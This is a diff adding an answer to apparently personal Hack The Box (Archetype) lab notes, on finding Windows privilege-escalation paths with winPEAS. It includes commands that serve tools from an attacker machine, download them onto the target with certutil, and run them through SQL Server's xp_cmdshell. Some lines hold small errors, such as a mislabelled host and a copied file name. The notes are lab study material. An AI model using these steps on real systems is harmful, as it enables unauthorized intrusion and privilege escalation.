@@ -198,5 +198,23 @@ What extended stored procedure of Microsoft SQL Server can be used in order to s
 - Example: `xp_cmdshell dir` runs `dir` as if from the cmd command line
 
 What script can be used in order to search possible paths to escalate privileges on Windows hosts?
-- Answer: 
+- Answer: winPEAS (Windows Privilege Escalation Awesome Scripts)
+- [reference](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) | [video](https://youtu.be/66gOwXMnxRI?si=p-LAKUSdIk8ICMBT)
+1. Copy desired files from the repo to your local/attack machine. Example: `winPEAS.bat` and/or `winPEASany.exe`
+2. Spin up a Python web server in that subdir to serve up those files. Example: `python3 -m http.server 8888`
+3. Upload those files to the Windows target. Example:
+```
+certutil -urlcache -f http://[target_ip]:[port]/winPEAS.bat C:\tmp\winPEAS.bat
+certutil -urlcache -f http://[target_ip]:[port]/winPEAS.bat C:\tmp\winPEASany.exe
+```
+5. Run winPEAS. Example: `c:\tmp\winPEAS.bat`
+
+Command I ran in this HTB: 
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell c:\tmp\winPEAS.bat
+```
+
+
+
+
 - 
